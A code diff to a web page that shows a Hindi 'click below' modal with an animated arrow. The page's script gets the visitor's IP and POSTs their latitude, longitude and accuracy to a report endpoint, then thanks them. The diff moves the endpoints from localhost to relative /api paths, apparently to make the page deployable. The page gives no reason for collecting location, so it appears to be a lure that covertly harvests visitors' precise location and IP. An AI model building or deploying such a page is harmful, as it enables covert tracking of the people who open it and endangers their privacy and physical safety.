@@ -70,7 +70,6 @@
       from {transform: translateY(50px); opacity: 0;}
       to {transform: translateY(0); opacity: 1;}
     }
-    /* SVG arrow animation */
     .arrow-animate {
       animation: bounce 1s infinite;
     }
@@ -88,7 +87,6 @@
     <div class="modal-content">
       <p id="modalText">नीचे क्लिक करें</p>
       <button id="clickBtn">
-        <!-- Animated SVG arrow -->
         <svg class="arrow-animate" width="24" height="24" viewBox="0 0 24 24" fill="none">
           <path d="M12 5v14M5 12l7 7 7-7" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
@@ -106,7 +104,7 @@
 
     async function getIpFromServer() {
       try {
-        const r = await fetch('http://localhost:3000/whoami');
+        const r = await fetch('/api/whoami');
         if (!r.ok) return null;
         const j = await r.json();
         return j.ip;
@@ -130,19 +128,13 @@
 
         const payload = { latitude, longitude, accuracy };
 
-        const res = await fetch('http://localhost:3000/report', {
+        const res = await fetch('/api/report', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
 
         const data = await res.json();
-
-        // await show(JSON.stringify({
-        //   clientIp: ip,
-        //   latitude, longitude, accuracy,
-        //   serverResponse: data
-        // }, null, 2));
 
         document.getElementById('modalText').textContent = "धन्यवाद!";
         document.getElementById('clickBtn').style.display = "none";
